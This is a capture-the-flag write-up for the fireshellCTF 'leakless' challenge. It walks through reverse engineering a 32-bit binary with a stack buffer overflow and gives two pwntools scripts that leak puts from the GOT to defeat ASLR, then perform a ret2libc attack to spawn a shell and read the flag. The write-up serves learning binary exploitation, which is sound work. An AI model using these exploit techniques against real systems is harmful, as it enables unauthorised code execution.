## fireshellCTF: leakless
> Who does need a leak nowadays?

##### *tl;dr: leak addresses to ret2libc*
#### I wasn't able to solve any of these challenges during the duration of the ctf, but I'm hosting them locally (files can be downloaded [here](https://github.com/alissonbezerra/fireshell-ctf-2019/tree/master/pwn)) and going over them to learn new stuff. For this challenge, we are given only a binary to play around with, so first thing to do is to check the security measures of the binary:
```
$ checksec leakless
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
## Reverse Engineering
#### Interestingly, we see that NX is enabled which means that the classic shellcode attack won't work - but ret2libc will. From my experiences from solving pwn challs, binaries from the server side have ASLR turned on, so we'll take a note of that. To have a better understanding of the binary, we decompile it with GHIDRA. Looking at the functions, we see the vulnerable one - feedme:
```c
void feedme(void)

{
  undefined local_4c [68];
  
  __x86.get_pc_thunk.ax();
  read(0,local_4c,0x100);
  return;
}
```
#### We see that a buffer is initialized for 68 bytes only but read reads up to 256 - thus causing a buffer overflow. We'll take advantage of this to perform a ret2libc attack and since ASLR is turned on server side, we'll need to leak some addresses. For this, we'll use the puts function present in the binary to print out functions from the server, then return back to main to prevent program termination. Before we do that, we need to find out which offset overwrites the return address then let's get the addresses we need:
```
$ gdb ./leakless
	gdb-peda$ p puts
	$1 = {<text variable, no debug info>} 0x80483f0 <puts@plt>
	
	gdb-peda$ p main
	$2 = {<text variable, no debug info>} 0x804861a <main>

	gdb-peda$ disas puts
	Dump of assembler code for function puts@plt:
	   0x080483f0 <+0>:	jmp    DWORD PTR ds:0x804a018
	   0x080483f6 <+6>:	push   0x18
	   0x080483fb <+11>:	jmp    0x80483b0
	End of assembler dump.
	
	gdb-peda$ pattern create 100
	'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
	
	gdb-peda$ r
	AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
	[...]
	Stopped reason: SIGSEGV
	0x41344141 in ?? ()
	
	gdb-peda$ pattern offset 0x41344141
	1093943617 found at offset: 76
```
## Exploitation
#### There we have it: the offset needed to overwrite the eip register is 76, we've got the addresses for both puts' plt and got entries as well as main. The plan here is to jump to call puts, providing the GOT address as its argument to leak it's address, then loop back to main. To execute that, we craft a simple python script:
```python
from pwn import *

#: Connect to challenge server
binary = ELF('./leakless')
p = binary.process()

#: Exploit code; Stage 1
offset = 'A' * 76
puts_plt = binary.plt['puts']
main_addr = binary.symbols['main']
puts_got = binary.got['puts']
exploit = offset + p32(puts_plt) + p32(main_addr) + p32(puts_got)

#: Send payload; Stage 1
p.sendline(exploit)
puts_leak = u32(p.recv()[:4])
print(hex(puts_leak))
```
#### Running the script returns `0xf7dd2b40`, but it will return a different address every time it is ran. What we do want to take note of is the last 3 bytes which are always constant. Having this, we reference is against `libc.blukat.me` to find out which libc version we're using. This will help us get the address offsets for the functions and ingredients we need to get a shell. When we do it, we find out that the libc the server uses is `libc6_2.27-3ubuntu1_i386`. We download this and use it within our exploit do get some useful addresses. 
#### As soon as we've downloaded it, we calculate the libc base by subtracting the libc's puts offset from the one we leaked from the server. From this point will be smooth sailing, since all we need to do is to add the libc base address to the offsets of `system` and `exit` as well as the pointer to a `/bin/sh` string - repeat the same process we did with the leak, and then enjoy our shell. For the final payload, we have this script:
```python
from pwn import *

#: Connect to challenge server
libc = ELF('libc6_2.27-3ubuntu1_i386.so')
binary = ELF('./leakless')
p = binary.process()

#: Exploit code; Stage 1
offset = 'A' * 76
puts_plt = binary.plt['puts']
main_addr = binary.symbols['main']
puts_got = binary.got['puts']
exploit = offset + p32(puts_plt) + p32(main_addr) + p32(puts_got)

#: Send payload; Stage 1
p.sendline(exploit)
puts_leak = u32(p.recv()[:4])
print(hex(puts_leak))

#: Exploit code; Stage 2
libc_base = puts_leak - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
exit_addr = libc_base + libc.symbols['exit']
bin_sh = libc_base + libc.search('/bin/sh').next()
exploit = offset + p32(system_addr) + p32(exit_addr) + p32(bin_sh)

#: Send payload; Stage 2
p.sendline(exploit)
p.interactive()
```
#### Run the script, enjoy the shell, cat the flag!
```
$ python exploit.py
0xf7d5ab40
[*] Switching to interactive mode
$ cat flag.txt
F#{y3ah!!_y0u_d1d_1t!_C0ngr4tz}
```
	
	
